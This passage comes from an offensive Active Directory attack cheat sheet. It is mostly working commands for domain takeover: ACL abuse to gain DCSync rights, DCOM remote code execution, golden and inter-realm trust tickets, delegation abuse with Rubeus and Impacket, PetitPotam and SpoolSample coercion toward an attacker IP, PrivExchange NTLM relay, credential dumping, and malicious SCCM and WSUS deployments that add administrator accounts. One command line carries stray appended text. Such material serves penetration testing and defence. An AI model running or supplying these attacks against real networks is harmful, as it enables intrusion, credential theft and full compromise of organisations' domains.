like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/ :warning: The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (>2016), it requires a registry change to re-enable. $UserObject = ([ADSI](\"LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld\")) $UserObject.TerminalServicesInitialProgram = \"\\\\1.2.3.4\\share\\file.exe\" $UserObject.TerminalServicesWorkDirectory = \"C:\\\" $UserObject.SetInfo() NOTE: To not alert the user the payload should hide its own process window and spawn the normal graphical environment. WriteDACL To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. Invoke-ACLPwn is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : ./Invoke-ACL.ps1 -SharpHoundLocation .\\sharphound.exe -mimiKatzLocation .\\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!' WriteDACL on Domain: On Windows: powershell # Give DCSync right to the principal identity Import-Module .\\PowerView.ps1 $SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\\user1', $SecPassword) Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local On Linux: ```bash Give DCSync right to the principal identity bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B addDomainSync user2 Remove right after DCSync bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B delDomainSync user2 ``` WriteDACL on Group powershell Add-DomainObjectAcl -TargetIdentity \"INTERESTING_GROUP\" -Rights WriteMembers -PrincipalIdentity User1 net group \"INTERESTING_GROUP\" User1 /add /domain WriteOwner An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. This can be achieved with Set-DomainObjectOwner (PowerView module). Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal' This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group. ReadLAPSPassword An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module. Detail of the exploitation can be found in the Reading LAPS Password section. Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime' ReadGMSAPassword An attacker can read the GMSA password of the account this ACE applies to. This can be achieved with the Active Directory and DSInternals PowerShell modules. # Save the blob to a variable $gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword' $mp = $gmsa.'msDS-ManagedPassword' # Decode the data structure using the DSInternals module ConvertFrom-ADManagedPasswordBlob $mp ForceChangePassword An attacker can change the password of the user this ACE applies to: * On Windows, this can be achieved with Set-DomainUserPassword (PowerView module): $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword On Linux: # Using rpcclient from the Samba software suite rpcclient -U 'attacker_user%my_password' -W DOMAIN -c \"setuserinfo2 target_user 23 target_newpwd\" # Using bloodyAD with pass-the-hash bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd DCOM Exploitation DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer. Impacket DCOMExec.py ```ps1 dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC] [-object [{ShellWindows,ShellBrowserWindow,MMC20}]] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB] target [command ...] dcomexec.py -share C$ -object MMC20 ' / : @ ' dcomexec.py -share C$ -object MMC20 ' / : @ ' 'ipconfig' python3 dcomexec.py -object MMC20 -silentcommand -debug $DOMAIN/$USER:$PASSWORD\\$@$HOST 'notepad.exe' # -object MMC20 specifies that we wish to instantiate the MMC20.Application object. # -silentcommand executes the command without attempting to retrieve the output. * CheeseTools - https://github.com/klezVirus/CheeseTools powershell # https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/ -t, --target=VALUE Target Machine -b, --binary=VALUE Binary: powershell.exe -a, --args=VALUE Arguments: -enc -m, --method=VALUE Methods: MMC20Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro -r, --reg, --registry Enable registry manipulation -h, -?, --help Show Help Current Methods: MMC20.Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro. * Invoke-DCOM - https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1 powershell Import-Module .\\Invoke-DCOM.ps1 Invoke-DCOM -ComputerName '10.10.10.10' -Method MMC20.Application -Command \"calc.exe\" Invoke-DCOM -ComputerName '10.10.10.10' -Method ExcelDDE -Command \"calc.exe\" Invoke-DCOM -ComputerName '10.10.10.10' -Method ServiceStart \"MyService\" Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellBrowserWindow -Command \"calc.exe\" Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellWindows -Command \"calc.exe\" ``` DCOM via MMC Application Class This COM object (MMC20.Application) allows you to script components of MMC snap-in operations. there is a method named \"ExecuteShellCommand\" under Document.ActiveView . PS C:\\> $com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"10.10.10.1\")) PS C:\\> $com.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\calc.exe\",$null,$null,7) PS C:\\> $com.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\",$null,\"-enc DFDFSFSFSFSFSFSFSDFSFSF < Empire encoded string > \",\"7\") # Weaponized example with MSBuild PS C:\\> [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"10.10.10.1\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\",$null,\"\\\\10.10.10.2\\webdav\\build.xml\",\"7\") Invoke-MMC20RCE : https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1 DCOM via Office Excel.Application DDEInitiate RegisterXLL Outlook.Application CreateObject->Shell.Application->ShellExecute CreateObject->ScriptControl (office-32bit only) Visio.InvisibleApp (same as Visio.Application, but should not show the Visio window) Addons ExecuteLine Word.Application RunAutoMacro # Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM Invoke-Excel4DCOM64.ps1 https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9 Invoke-ExShellcode.ps1 https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a # Using Excel DDE PS C:\\> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\")) PS C:\\> $excel.DisplayAlerts = $false PS C:\\> $excel.DDEInitiate(\"cmd\", \"/c calc.exe\") # Using Excel RegisterXLL # Can't be used reliably with a remote target Require: reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\Trusted Locations /v AllowsNetworkLocations /t REG_DWORD /d 1 PS> $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\", \"$ComputerName\")) PS> $excel.RegisterXLL(\"EvilXLL.dll\") # Using Visio $visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\"Visio.InvisibleApp\", \"$ComputerName\")) $visio.Addons.Add(\"C:\\Windows\\System32\\cmd.exe\").Run(\"/c calc\") DCOM via ShellExecute $com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',\"10.10.10.1\") $obj = [System.Activator]::CreateInstance($com) $item = $obj.Item() $item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0) DCOM via ShellBrowserWindow :warning: Windows 10 only, the object doesn't exists in Windows 7 $com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',\"10.10.10.1\") $obj = [System.Activator]::CreateInstance($com) $obj.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0) Trust relationship between domains One-way Domain B trusts A Users in Domain A can access resources in Domain B Users in Domain B cannot access resources in Domain A Two-way Domain A trusts Domain B Domain B trusts Domain A Authentication requests can be passed between the two domains in both directions Enumerate trusts between domains nltest /trusted_domains or ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() SourceName TargetName TrustType TrustDirection ---------- ---------- --------- -------------- domainA.local domainB.local TreeRoot Bidirectional Exploit trusts between domains :warning: Require a Domain-Admin level access to the current domain. Source Target Technique to use Trust relationship Root Child Golden Ticket + Enterprise Admin group (Mimikatz /groups) Inter Realm (2-way) Child Child SID History exploitation (Mimikatz /sids) Inter Realm Parent-Child (2-way) Child Root SID History exploitation (Mimikatz /sids) Inter Realm Tree-Root (2-way) Forest A Forest B PrinterBug + Unconstrained delegation ? Inter Realm Forest or External (2-way) Child Domain to Forest Compromise - SID Hijacking Most trees are linked with dual sided trust relationships to allow for sharing of resources. By default the first domain created if the Forest Root. Requirements : - KRBTGT Hash - Find the SID of the domain ```powershell $ Convert-NameToSid target.domain.com\\krbtgt S-1-5-21-2941561648-383941485-1389968811-502 # with Impacket lookupsid.py domain/user:password@10.10.10.10 ``` Replace 502 with 519 to represent Enterprise Admins Create golden ticket and attack parent domain. powershell kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt Forest to Forest Compromise - Trust Ticket Require: SID filtering disabled From the DC, dump the hash of the currentdomain\\targetdomain$ trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using Mimikatz, adding the SID for the target domain's enterprise admins group to our SID history . Dumping trust passwords (trust keys) Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing $ are computer accounts, but some are trust accounts. lsadump::trust /patch or find the TRUST_NAME$ machine account hash Create a forged trust ticket (inter-realm TGT) using Mimikatz mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\\temp\\trust.kirbi mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi Use the Trust Ticket file to get a TGS for the targeted service .\\asktgs.exe c:\\temp\\trust.kirbi CIFS/machine.domain.local .\\Rubeus.exe asktgs /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt Inject the TGS file and access the targeted service with the spoofed rights. kirbikator lsa .\\ticket.kirbi ls \\\\machine.domain.local\\c$ Privileged Access Management (PAM) Trust Require: Windows Server 2016 or earlier If we compromise the bastion we get Domain Admins privileges on the other domain Default configuration for PAM Trust ps1 # execute on our forest netdom trust lab.local /domain:bastion.local /ForestTransitive:Yes netdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes netdom trust lab.local /domain:bastion.local /EnablePIMTrust:Yes netdom trust lab.local /domain:bastion.local /Quarantine:No # execute on our bastion netdom trust bastion.local /domain:lab.local /ForestTransitive:Yes Enumerate ```ps1 # Using ADModule Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} Enumerate shadow security principals Get-ADObject -SearchBase (\"CN=Shadow Principal Configuration,CN=Services,\" + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl ``` * Compromise * Using SID History * Using the previously found Shadow Security Principal Kerberos Unconstrained Delegation The user sends a TGS to access the service, along with their TGT, and then the service can use the user's TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory. :warning: Unconstrained delegation used to be the only option available in Windows 2000 SpoolService Abuse with Unconstrained Delegation The goal is to gain DC Sync privileges using a computer account and the SpoolService bug. Requirements : - Object with Property Trust this computer for delegation to any service (Kerberos only) - Must have ADS_UF_TRUSTED_FOR_DELEGATION - Must not have ADS_UF_NOT_DELEGATED flag - User must not be in the Protected Users group - User must not have the flag Account is sensitive and cannot be delegated Find delegation :warning: : Domain controllers usually have unconstrained delegation enabled. Check the TrustedForDelegation property. ADModule powershell # From https://github.com/samratashok/ADModule PS> Get-ADComputer -Filter {TrustedForDelegation -eq $True} ldapdomaindump powershell $> ldapdomaindump -u \"DOMAIN\\\\Account\" -p \"Password123*\" 10.10.10.10 grep TRUSTED_FOR_DELEGATION domain_computers.grep CrackMapExec module powershell cme ldap 10.10.10.10 -u username -p password --trusted-for-delegation SpoolService status Check if the spool service is running on the remote host ls \\\\dc01\\pipe\\spoolss python rpcdump.py DOMAIN/user:password@10.10.10.10 Monitor with Rubeus Monitor incoming connections from Rubeus. Rubeus.exe monitor /interval:1 Force a connect back from the DC Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object. SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a \"feature\" in the MS-RPRN RPC interface. # From https://github.com/leechristensen/SpoolSample .\\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME .\\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB # DC01.HACKER.LAB is the domain controller we want to compromise # HELPDESK.HACKER.LAB is the machine with delegation enabled that we control. # From https://github.com/dirkjanm/krbrelayx printerbug.py 'domain/username:password'@<VICTIM-DC-NAME> <UNCONSTRAINED-SERVER-DC-NAME> # From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689 python dementor.py -d domain -u username -p password <UNCONSTRAINED-SERVER-DC-NAME> <VICTIM-DC-NAME> If the attack worked you should get a TGT of the domain controller. Load the ticket Extract the base64 TGT from Rubeus output and load it to our current session. .\\Rubeus.exe asktgs /ticket:<ticket base64> /ptt Alternatively you could also grab the ticket using Mimikatz : mimikatz # sekurlsa::tickets Then you can use DCsync or another attack : mimikatz # lsadump::dcsync /user:HACKER\\krbtgt Mitigation Ensure sensitive accounts cannot be delegated Disable the Print Spooler Service MS-EFSRPC Abuse with Unconstrained Delegation Using PetitPotam , another tool to coerce a callback from the targeted machine, instead of SpoolSample . # Coerce the callback git clone https://github.com/topotam/PetitPotam python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP # Extract the ticket .\\Rubeus.exe asktgs /ticket:<ticket base64> /ptt Kerberos Constrained Delegation Request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets getST.py script, however, Passing the -impersonate flag and specifying the user we wish to impersonate (any valid username). # Discover $ Get-DomainComputer -TrustedToAuth | select -exp dnshostname # Find the service $ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo Exploit the Constrained Delegation Impacket bash $ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10 Rubeus bash $ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:... $ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt $ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:\"cifs/dc.domain.com\" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt $ dir \\\\dc.domain.com\\c$ Impersonate a domain user on a resource Require: * SYSTEM level privileges on a machine configured with constrained delegation PS> [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null PS> $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator') PS> $idToImpersonate.Impersonate() PS> [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name PS> ls \\\\dc01.offense.local\\c$ Kerberos Resource Based Constrained Delegation Resource-based Constrained Delegation was introduced in Windows Server 2012. The user sends a TGS to access the service (\"Service A\"), and if the service is allowed to delegate to another pre-defined service (\"Service B\"), then Service A can present to the authentication service the TGS that the user provided and obtain a TGS for the user to Service B. https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html Import Powermad and Powerview powershell PowerShell.exe -ExecutionPolicy Bypass Import-Module .\\powermad.ps1 Import-Module .\\powerview.ps1 Get user SID powershell $AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid $ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID} $ACE ConvertFrom-SID $ACE.SecurityIdentifier Abuse MachineAccountQuota to create a computer account and set an SPN for it powershell New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString 'Weakest123*' -AsPlainText -Force) Rewrite DC's AllowedToActOnBehalfOfOtherIdentity properties powershell $ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\" $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0 $Descriptor.DiscretionaryAcl ```ps1 alternative $SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)\"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} alternative StandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND ``` Use Rubeus to get hash from password powershell Rubeus.exe hash /password:'Weakest123*' /user:swktest$ /domain:factory.lan [*] Input password : Weakest123* [*] Input username : swktest$ [*] Input domain : factory.lan [*] Salt : FACTORY.LANswktest [*] rc4_hmac : F8E064CA98539B735600714A1F1907DD [*] aes128_cts_hmac_sha1 : D45DEADECB703CFE3774F2AA20DB9498 [*] aes256_cts_hmac_sha1 : 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 [*] des_cbc_md5 : BA297CFD07E62A5E Impersonate domain admin using our newly created machine account ```powershell .\\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap .\\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap [ ] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan' [ ] Using domain controller: DC01-WW2.factory.lan (172.16.42.5) [ ] Building S4U2proxy request for service: 'cifs/dc01-ww2.factory.lan' [ ] Sending S4U2proxy request [+] S4U2proxy success! [*] base64(ticket.kirbi) for SPN 'cifs/dc01-ww2.factory.lan': doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE LmZhY3RvcnkubGFu [*] Action: Import Ticket [+] Ticket successfully imported! ``` Kerberos Bronze Bit Attack - CVE-2020-17049 An attacker can impersonate users which are not allowed to be delegated. This includes members of the Protected Users group and any other users explicitly configured as sensitive and cannot be delegated . Patch is out on November 10, 2020, DC are most likely vulnerable until February 2021 . :warning: Patched Error Message : [-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified) Requirements: * Service account's password hash * Service account's with Constrained Delegation or Resource Based Constrained Delegation * Impacket PR #1013 Attack #1 - Bypass the Trust this user for delegation to specified services only \u2013 Use Kerberos only protection and impersonate a user who is protected from delegation. # forwardable flag is only protected by the ticket encryption which uses the service account's password $ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes <LM:NTLM hash> -aesKey <AES hash> test.local/Service1 -force-forwardable -dc-ip <Domain controller> # -> Forwardable $ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable # Load the ticket .\\mimikatz\\mimikatz.exe \"kerberos::ptc User2.ccache\" exit # Access \"c$\" ls \\\\service2.test.local\\c$ Attack #2 - Write Permissions to one or more objects in the AD # Create a new machine account Import-Module .\\Powermad\\powermad.ps1 New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force) .\\mimikatz\\mimikatz.exe \"kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local\" exit # Set PrincipalsAllowedToDelegateToAccount Install-WindowsFeature RSAT-AD-PowerShell Import-Module ActiveDirectory Get-ADComputer AttackerService Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$ Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount # Execute the attack python .\\impacket\\examples\\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$ # Load the ticket .\\mimikatz\\mimikatz.exe \"kerberos::ptc User2.ccache\" exit | Out-Null PrivExchange attack Exchange your privileges for Domain Admin privs by abusing Exchange. :warning: You need a shell on a user account with a mailbox. Exchange server hostname or IP address bash pth-net rpc group members \"Exchange Servers\" -I dc01.domain.local -U domain/username Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket). powershell ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server's to send back its NTLMv2 hash to a controlled machine. ```bash https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange https://github.com/G0ldenGunSec/PowerPriv powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016 ``` Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user's NTLM hash bash python secretsdump.py xxxxxxxxxx -just-dc python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm Clean your mess and restore a previous state of the user's ACL powershell python aclpwn.py --restore ../aclpwn-20190319-125741.restore Alternatively you can use the Metasploit module use auxiliary/scanner/http/exchange_web_server_pushsubscription Alternatively you can use an all-in-one tool : Exchange2domain. git clone github.com/Ridter/Exchange2domain python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip SCCM Deployment SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation. PowerSCCM - PowerShell module to interact with SCCM deployments MalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage Compromise client, use locate to find management server ps1 MalSCCM.exe locate Enumerate over WMI as an administrator of the Distribution Point ps1 MalSCCM.exe inspect /server:<DistributionPoint Server FQDN> /groups Compromise management server, use locate to find primary server use Inspect on primary server to view who you can target ps1 MalSCCM.exe inspect /all MalSCCM.exe inspect /computers MalSCCM.exe inspect /primaryusers MalSCCM.exe inspect /groups Create a new device group for the machines you want to laterally move too ps1 MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device MalSCCM.exe inspect /groups Add your targets into the new group ps1 MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL Create an application pointing to a malicious EXE on a world readable share : SCCMContentLib$ ps1 MalSCCM.exe app /create /name:demoapp /uncpath:\"\\\\BLORE-SCCM\\SCCMContentLib$\\localthread.exe\" MalSCCM.exe inspect /applications Deploy the application to the target group ps1 MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment MalSCCM.exe inspect /deployments Force the target group to checkin for updates ps1 MalSCCM.exe checkin /groupname:TargetGroup Cleanup the application, deployment and group ps1 MalSCCM.exe app /cleanup /name:demoapp MalSCCM.exe group /delete /groupname:TargetGroup WSUS Deployment Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network :warning: The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary. SharpWSUS Locate using HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate or SharpWSUS.exe locate After WSUS Server compromise: SharpWSUS.exe inspect Create a malicious patch: SharpWSUS.exe create /payload:\"C:\\Users\\ben\\Documents\\pk\\psexec.exe\" /args:\"-accepteula -s -d cmd.exe /c \\\"net user WSUSDemo Password123! /add && net localgroup administrators WSUSDemo /add\\\"\" /title:\"WSUSDemo\" Deploy it on the target: SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:\"Demo Group\" Check status deployment: SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local Clean up: SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:\u201dDemo Group RODC - Read Only Domain Controller Compromise If the user is included in the Allowed RODC Password Replication , their credentials are stored in the server, and the msDS-RevealedList attribute of the RODC is populated with the username. Requirements : * Impacket PR #1210 - The Kerberos Key List Attack * krbtgt credentials of the RODC (-rodcKey) * ID of the krbtgt account of the RODC (-rodcNo) Exploitation : # keylistattack.py using SAMR user enumeration without filtering (-full flag) keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full # keylistattack.py defining a target username (-t flag) keylistattack.py -kdc sever.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST # secretsdump.py using the Kerberos Key List Attack option (-use-keylist) secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist PXE Boot image attack PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it. Press [F8] during the PXE boot to spawn an administrator console on the deployed machine. Press [SHIFT+F10] during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry. powershell net user hacker Password123! /add net localgroup administrators /add hacker Extract the pre-boot image (wim files) using PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe) and dig through it to find default passwords and domain accounts. ```powershell Import the module PS > Import-Module .\\PowerPXE.ps1 Start the exploit on the Ethernet interface PS > Get-PXEcreds -InterfaceAlias Ethernet PS > Get-PXECreds -InterfaceAlias \u00ab lab 0 \u00bb Wait for the DHCP to get an address Get a valid IP address DHCP proposal IP address: 192.168.22.101 DHCP Validation: DHCPACK IP address configured: 192.168.22.101 Extract BCD path from the DHCP response Request BCD File path BCD File path: \\Tmp\\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd TFTP IP Address: 192.168.22.3 Download the BCD file and extract wim files Launch TFTP download Transfer succeeded. Parse the BCD file: conf.bcd Identify wim file : \\Boot\\x86\\Images\\LiteTouchPE_x86.wim Identify wim file : 